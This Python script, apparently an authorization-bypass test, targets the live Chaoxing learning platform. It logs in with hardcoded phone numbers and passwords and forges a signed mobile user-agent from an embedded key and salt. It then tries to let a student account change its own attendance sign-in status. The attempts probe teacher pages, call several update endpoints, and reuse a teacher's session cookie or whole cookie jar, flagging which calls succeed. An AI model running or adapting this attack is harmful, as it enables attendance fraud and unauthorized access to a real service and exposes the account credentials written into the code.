import base64, hashlib, json, os, uuid, requests, urllib3, re, time
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from datetime import datetime

urllib3.disable_warnings()

AES_KEY = b"u2oh6Vu^HWe4_AES"
SCHILD_SALT = "ipL$TkeiEmfy1gTXb2XHrdLN0a@7c^vu"
LOGIN_URL = "https://passport2.chaoxing.com/fanyalogin"
COURSE_ID = "257485372"
CLASS_ID = "132821141"
TEACHER_PUID = "402644510"
STUDENT_PUID = "431407443"
TEST_AID = "5000163767353"

def aes_enc(p):
    c = AES.new(AES_KEY, AES.MODE_CBC, AES_KEY)
    return base64.b64encode(c.encrypt(pad(p.encode(), AES.block_size))).decode()

def schild_sign(model, locale, version, build, imei):
    parts = [f"(schild:{SCHILD_SALT})", f"(device:{model})", f"Language/{locale}",
             f"com.chaoxing.mobile/ChaoXingStudy_3_{version}_android_phone_{build}",
             f"(@Kalimdor)_{imei}"]
    return hashlib.md5(" ".join(parts).encode()).hexdigest()

def get_mobile_ua():
    imei = uuid.uuid4().hex[:32]
    sc = schild_sign("MI10", "zh_CN", "6.7.2", "10941_314", imei)
    return (f"Mozilla/5.0 (Linux; Android 16; MI10 Build/OPM1.171019.019; wv) "
            f"AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.99 Mobile Safari/537.36 "
            f"(schild:{sc}) (device:MI10) Language/zh_CN "
            f"com.chaoxing.mobile/ChaoXingStudy_3_6.7.2_android_phone_10941_314 "
            f"(@Kalimdor)_{imei}")

def login(phone, pwd):
    s = requests.Session()
    s.verify = False
    ua = get_mobile_ua()
    s.headers.update({"User-Agent": ua, "Accept": "application/json, text/plain, */*", "Accept-Language": "zh_CN"})
    s.post(LOGIN_URL, data={"fid": "-1", "uname": aes_enc(phone), "password": aes_enc(pwd),
                            "refer": "http%3A%2F%2Fi.mooc.chaoxing.com", "t": "true",
                            "forbidotherlogin": "0", "validate": "", "doubleFactorLogin": "0",
                            "independentId": "0", "independentNameId": "0"},
           allow_redirects=False, timeout=30)
    puid = ""
    for c in s.cookies:
        if c.name in ("UID", "_uid"):
            puid = c.value
    try:
        s.get("https://i.chaoxing.com/base", timeout=20, allow_redirects=True)
    except:
        pass
    try:
        s.get("https://mooc1-api.chaoxing.com/mooc-ans/mycourse/backclazzdata?view=json&m=0", timeout=20)
    except:
        pass
    return s, puid

def safe_json(r):
    try:
        return r.json()
    except:
        return {"_raw_status": r.status_code, "_raw_text": r.text[:500]}

results = []

def rec(tag, detail, evidence=""):
    results.append({"tag": tag, "detail": detail, "evidence": evidence[:800]})
    vuln = any(kw in detail.lower() for kw in ["success", "修改成功"]) or '"state":"success"' in evidence
    icon = "🔴" if vuln else "  "
    print(f"  {icon} {tag}: {detail[:200]}")

def run():
    print("=" * 80)
    print(f"学生端直接修改签到状态 - 深度绕过测试")
    print(f"时间: {datetime.now():%Y-%m-%d %H:%M:%S}")
    print("=" * 80)

    print("\n[1] 登录账号...")
    s_t, puid_t = login("19712720708", "3.1415926Cpy")
    s_s, puid_s = login("18436633997", "3.1415926Cpy")
    print(f"  教师puid={puid_t}, 学生puid={puid_s}")

    base = "https://mobilelearn.chaoxing.com"

    print("\n[2] 分析教师账号为何能调用成功")
    print("=" * 80)

    r = s_t.get("https://mooc1-api.chaoxing.com/mooc-ans/mycourse/backclazzdata?view=json&m=0", timeout=20)
    d = safe_json(r)
    teacher_courses = []
    if isinstance(d, dict) and "channelList" in d:
        for ch in d["channelList"]:
            c = ch.get("content", {})
            course = c.get("course", {}).get("data", [{}])[0] if c.get("course", {}).get("data") else {}
            if course.get("id"):
                teacher_courses.append({
                    "courseid": str(course.get("id", "")),
                    "classid": str(c.get("id", "")),
                    "cpi": str(c.get("cpi", "")),
                    "name": c.get("name", "") or course.get("name", ""),
                    "roletype": c.get("roletype", 0),
                    "bbsid": str(c.get("bbsid", "")),
                })
    for c in teacher_courses:
        if c["classid"] == CLASS_ID or "111" in c["name"] or "exam" in c["name"].lower():
            print(f"  教师在目标课程: name={c['name']}, courseid={c['courseid']}, classid={c['classid']}, cpi={c['cpi']}, roletype={c['roletype']}")

    r = s_s.get("https://mooc1-api.chaoxing.com/mooc-ans/mycourse/backclazzdata?view=json&m=0", timeout=20)
    d = safe_json(r)
    student_courses = []
    if isinstance(d, dict) and "channelList" in d:
        for ch in d["channelList"]:
            c = ch.get("content", {})
            course = c.get("course", {}).get("data", [{}])[0] if c.get("course", {}).get("data") else {}
            if course.get("id"):
                student_courses.append({
                    "courseid": str(course.get("id", "")),
                    "classid": str(c.get("id", "")),
                    "cpi": str(c.get("cpi", "")),
                    "name": c.get("name", "") or course.get("name", ""),
                    "roletype": c.get("roletype", 0),
                    "bbsid": str(c.get("bbsid", "")),
                })
    for c in student_courses:
        if c["classid"] == CLASS_ID or "111" in c["name"] or "exam" in c["name"].lower():
            print(f"  学生在目标课程: name={c['name']}, courseid={c['courseid']}, classid={c['classid']}, cpi={c['cpi']}, roletype={c['roletype']}")

    print("\n" + "=" * 80)
    print("[3] 学生访问教师管理页面获取Session")
    print("=" * 80)

    s_s_web = requests.Session()
    s_s_web.verify = False
    web_ua = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) "
              "Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0")
    s_s_web.headers.update({"User-Agent": web_ua})

    s_s_web.post("https://passport2.chaoxing.com/fanyalogin",
                 data={"fid": "-1", "uname": "18436633997", "password": "3.1415926Cpy",
                       "refer": "http://i.chaoxing.com", "t": "true",
                       "forbidotherlogin": "0", "validate": "", "doubleFactorLogin": "0"},
                 headers={"X-Requested-With": "XMLHttpRequest"},
                 allow_redirects=False, timeout=30)

    try:
        s_s_web.get("https://i.chaoxing.com/base", timeout=20, allow_redirects=True)
    except:
        pass

    print("\n--- 学生访问教师管理页面 ---")
    teacher_pages = [
        f"https://mooc1.chaoxing.com/mycourse/teacherindex?courseid={COURSE_ID}&clazzid={CLASS_ID}",
        f"https://mooc1.chaoxing.com/mycourse/stuindex?courseid={COURSE_ID}&clazzid={CLASS_ID}",
        f"{base}/pptSign/signedResult?activeId={TEST_AID}&classId={CLASS_ID}&courseId={COURSE_ID}&uid={puid_s}",
        f"{base}/newsign/preSign?activeId={TEST_AID}&classId={CLASS_ID}&courseId={COURSE_ID}&uid={puid_s}",
    ]

    for page_url in teacher_pages:
        try:
            r = s_s_web.get(page_url, timeout=20, allow_redirects=True)
            print(f"  访问 {page_url[:80]}: HTTP {r.status_code}, len={len(r.text)}")
        except Exception as e:
            print(f"  访问 {page_url[:80]}: ERROR {e}")

    cookie_after = [c.name for c in s_s_web.cookies]
    print(f"  访问后Cookie: {cookie_after}")

    print("\n--- 学生访问后调用updateSignStatusByUidsV2 ---")
    r = s_s_web.post(f"{base}/pptSign/updateSignStatusByUidsV2",
                     params={"DB_STRATEGY": "PRIMARY_KEY", "STRATEGY_PARA": "activeId", "activeId": TEST_AID},
                     data={"uids": STUDENT_PUID, "status": "2", "remark": ""},
                     headers={"Referer": f"{base}/", "X-Requested-With": "XMLHttpRequest",
                              "Content-Type": "application/x-www-form-urlencoded"},
                     timeout=20)
    rec("T3-01", f"学生访问管理页面后调用: {r.text[:100]}", r.text[:300])

    print("\n" + "=" * 80)
    print("[4] 学生使用教师cpi访问教师页面后调用API")
    print("=" * 80)

    teacher_cpi = ""
    for c in teacher_courses:
        if c["classid"] == CLASS_ID:
            teacher_cpi = c["cpi"]
    student_cpi = ""
    for c in student_courses:
        if c["classid"] == CLASS_ID:
            student_cpi = c["cpi"]
    print(f"  教师cpi={teacher_cpi}, 学生cpi={student_cpi}")

    if teacher_cpi:
        try:
            r = s_s_web.get(f"https://mooc1.chaoxing.com/mycourse/teacherindex?courseid={COURSE_ID}&clazzid={CLASS_ID}&cpi={teacher_cpi}",
                           timeout=20, allow_redirects=True)
            print(f"  学生访问教师页面(cpi): HTTP {r.status_code}, len={len(r.text)}")
        except Exception as e:
            print(f"  ERROR: {e}")

        r = s_s_web.post(f"{base}/pptSign/updateSignStatusByUidsV2",
                         params={"DB_STRATEGY": "PRIMARY_KEY", "STRATEGY_PARA": "activeId", "activeId": TEST_AID},
                         data={"uids": STUDENT_PUID, "status": "2", "remark": ""},
                         headers={"Referer": f"{base}/", "X-Requested-With": "XMLHttpRequest",
                                  "Content-Type": "application/x-www-form-urlencoded"},
                         timeout=20)
        rec("T4-01", f"学生+cpi访问教师页面后: {r.text[:100]}", r.text[:300])

    print("\n" + "=" * 80)
    print("[5] 关键测试：教师账号的roletype到底是什么？")
    print("=" * 80)

    r = s_t.get(f"{base}/ppt/activeAPI/taskactivelist",
                params={"courseId": COURSE_ID, "classId": CLASS_ID, "uid": puid_t}, timeout=20)
    d = safe_json(r)
    if isinstance(d, dict):
        rec("T5-01", f"教师活动列表: result={d.get('result')}, msg={d.get('msg','')}, count={len(d.get('activeList',[]))}",
            json.dumps(d, ensure_ascii=False)[:300])

    r = s_s.get(f"{base}/ppt/activeAPI/taskactivelist",
                params={"courseId": COURSE_ID, "classId": CLASS_ID, "uid": puid_s}, timeout=20)
    d = safe_json(r)
    if isinstance(d, dict):
        rec("T5-02", f"学生活动列表: result={d.get('result')}, msg={d.get('msg','')}, count={len(d.get('activeList',[]))}",
            json.dumps(d, ensure_ascii=False)[:300])

    print("\n" + "=" * 80)
    print("[6] 尝试：学生修改自己的签到状态（uids=自己，不同API端点）")
    print("=" * 80)

    student_modify_apis = [
        (f"{base}/pptSign/updateSignStatusByUidsV2", "updateSignStatusByUidsV2"),
        (f"{base}/pptSign/updateSignStatusByUids", "updateSignStatusByUids"),
        (f"{base}/pptSign/updateSignStatus", "updateSignStatus"),
        (f"{base}/pptSign/stuSignajax", "stuSignajax"),
    ]

    for url, name in student_modify_apis:
        for method in ["POST", "GET"]:
            try:
                if method == "POST":
                    r = s_s_web.post(url,
                                     params={"DB_STRATEGY": "PRIMARY_KEY", "STRATEGY_PARA": "activeId", "activeId": TEST_AID},
                                     data={"uids": STUDENT_PUID, "status": "2", "remark": "",
                                           "uid": puid_s, "studentId": STUDENT_PUID,
                                           "classId": CLASS_ID, "courseId": COURSE_ID},
                                     headers={"Referer": f"{base}/", "X-Requested-With": "XMLHttpRequest",
                                              "Content-Type": "application/x-www-form-urlencoded"},
                                     timeout=20)
                else:
                    r = s_s_web.get(url,
                                    params={"DB_STRATEGY": "PRIMARY_KEY", "STRATEGY_PARA": "activeId",
                                            "activeId": TEST_AID, "uids": STUDENT_PUID, "status": "2",
                                            "uid": puid_s, "studentId": STUDENT_PUID,
                                            "classId": CLASS_ID, "courseId": COURSE_ID},
                                    headers={"Referer": f"{base}/", "X-Requested-With": "XMLHttpRequest"},
                                    timeout=20)
                rec(f"T6-{name[:15]}-{method}", f"学生 {method} {name}: HTTP {r.status_code}, {r.text[:100]}", r.text[:300])
            except Exception as e:
                rec(f"T6-{name[:15]}-{method}", f"ERROR: {e}")

    print("\n" + "=" * 80)
    print("[7] 尝试：学生使用教师账号的JSESSIONID/route_mobilelearn")
    print("=" * 80)

    teacher_jsessionid = ""
    teacher_route_ml = ""
    for c in s_t.cookies:
        if c.name == "JSESSIONID":
            teacher_jsessionid = c.value
        if c.name == "route_mobilelearn":
            teacher_route_ml = c.value

    print(f"  教师JSESSIONID={teacher_jsessionid[:20]}..., route_mobilelearn={teacher_route_ml}")

    if teacher_jsessionid:
        s_with_jsession = requests.Session()
        s_with_jsession.verify = False
        s_with_jsession.headers.update(s_s_web.headers)
        for c in s_s_web.cookies:
            s_with_jsession.cookies.set(c.name, c.value, domain=c.domain, path=c.path)
        s_with_jsession.cookies.set("JSESSIONID", teacher_jsessionid, domain=".chaoxing.com", path="/")
        if teacher_route_ml:
            s_with_jsession.cookies.set("route_mobilelearn", teacher_route_ml, domain=".chaoxing.com", path="/")

        r = s_with_jsession.post(f"{base}/pptSign/updateSignStatusByUidsV2",
                                 params={"DB_STRATEGY": "PRIMARY_KEY", "STRATEGY_PARA": "activeId", "activeId": TEST_AID},
                                 data={"uids": STUDENT_PUID, "status": "2", "remark": ""},
                                 headers={"Referer": f"{base}/", "X-Requested-With": "XMLHttpRequest",
                                          "Content-Type": "application/x-www-form-urlencoded"},
                                 timeout=20)
        rec("T7-01", f"学生Cookie+教师JSESSIONID: {r.text[:100]}", r.text[:300])

    print("\n" + "=" * 80)
    print("[8] 尝试：学生使用完整教师Cookie但UID=学生")
    print("=" * 80)

    s_full_teacher = requests.Session()
    s_full_teacher.verify = False
    s_full_teacher.headers.update(s_s_web.headers)
    for c in s_t.cookies:
        s_full_teacher.cookies.set(c.name, c.value, domain=c.domain, path=c.path)

    r = s_full_teacher.post(f"{base}/pptSign/updateSignStatusByUidsV2",
                            params={"DB_STRATEGY": "PRIMARY_KEY", "STRATEGY_PARA": "activeId", "activeId": TEST_AID},
                            data={"uids": STUDENT_PUID, "status": "2", "remark": ""},
                            headers={"Referer": f"{base}/", "X-Requested-With": "XMLHttpRequest",
                                     "Content-Type": "application/x-www-form-urlencoded"},
                            timeout=20)
    rec("T8-01", f"完整教师Cookie(移动端): {r.text[:100]}", r.text[:300])

    print("\n" + "=" * 80)
    print("[9] 保存结果")
    print("=" * 80)

    report_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), "student_deep_bypass_results.json")
    with open(report_file, "w", encoding="utf-8") as f:
        json.dump(results, f, ensure_ascii=False, indent=2)
    print(f"  结果已保存到: {report_file}")
    print(f"  共 {len(results)} 项测试")

    success = sum(1 for r in results if '"state":"success"' in r.get("evidence", ""))
    perm = sum(1 for r in results if "无权限" in r.get("detail", "") or "无权限" in r.get("evidence", ""))
    print(f"  成功: {success}, 无权限: {perm}")

if __name__ == "__main__":
    run()
